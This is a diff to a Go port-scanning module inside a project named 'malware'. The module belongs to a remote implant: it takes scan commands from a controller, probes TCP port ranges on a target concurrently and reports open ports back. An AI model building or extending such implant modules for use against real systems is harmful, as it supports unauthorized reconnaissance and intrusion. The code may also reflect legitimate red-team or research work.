@@ -3,32 +3,32 @@ package portscan
 import (
 	"context"
 	"fmt"
-	"golang.org/x/sync/semaphore"
 	"malware/common/messages"
 	"malware/common/types"
 	"net"
 	"strings"
 	"sync"
 	"time"
+
+	"golang.org/x/sync/semaphore"
 )
 
 type state struct {
-	running  bool
 	scanning bool
 	lock     *semaphore.Weighted
 }
 
 type settings struct {
-	state *state // Tell our loop to stop
+	state *state
 }
 
 // Create creates an implementation of settings
 func Create() types.Module {
-	state := state{running: false, scanning: false, lock: semaphore.NewWeighted(100)}
+	state := state{scanning: false, lock: semaphore.NewWeighted(100)}
 	return settings{&state}
 }
 
-func ScanPort(ip string, port int, timeout time.Duration) bool {
+func ScanPort(ip string, port uint32, timeout time.Duration) bool {
 	target := fmt.Sprintf("%s:%d", ip, port)
 	conn, err := net.DialTimeout("tcp", target, timeout)
 
@@ -44,38 +44,39 @@ func ScanPort(ip string, port int, timeout time.Duration) bool {
 	return true
 }
 
-func (settings settings) portscan(portscan *messages.PortScan, callback func(*messages.ImplantReply)) {
+func (settings settings) portscan(portscan *messages.PortScan, callback func(*messages.CheckCmdRequest)) {
 	if portscan.Cancel {
 		settings.state.scanning = false
 	} else {
 		if settings.state.scanning {
-			callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_PORTSCAN_RUNNING})
+			callback(messages.Implant_error(settings.ID(), types.ERR_PORTSCAN_RUNNING))
 		} else {
+			settings.state.scanning = true
 			wg := sync.WaitGroup{}
 
-			settings.state.scanning = true
 			for port := portscan.StartPort; port <= portscan.EndPort && settings.state.scanning; port++ {
 				settings.state.lock.Acquire(context.TODO(), 1)
 				wg.Add(1)
 
-				go func(port int) {
+				go func(port uint32) {
 					defer settings.state.lock.Release(1)
 					defer wg.Done()
+
 					if ScanPort(portscan.Ip, port, time.Second/4) {
-						portscan_reply := &messages.PortScanReply{Status: messages.PortScanReply_IN_PROGRESS, Found: int32(port)}
-						callback(&messages.ImplantReply{Module: settings.ID(), Portscan: portscan_reply})
+						callback(messages.Implant_portscan_in_progress(settings.ID(), port))
 					}
-				}(int(port))
+				}(port)
 			}
 
+			// Wait for threads to join
 			wg.Wait()
 			settings.state.scanning = false
-			callback(&messages.ImplantReply{Module: settings.ID(), Portscan: &messages.PortScanReply{Status: messages.PortScanReply_COMPLETE}})
+			callback(messages.Implant_portscan_complete(settings.ID()))
 		}
 	}
 }
 
-func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
+func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
 	portscan := message.GetPortscan()
 	if portscan == nil {
 		return false
@@ -87,11 +88,9 @@ func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback
 
 // Init the state of this module
 func (settings settings) Init() {
-	settings.state.running = true
 }
 
 func (settings settings) Shutdown() {
-	settings.state.running = false
 }
 
 func (settings) ID() string { return "portscan" }
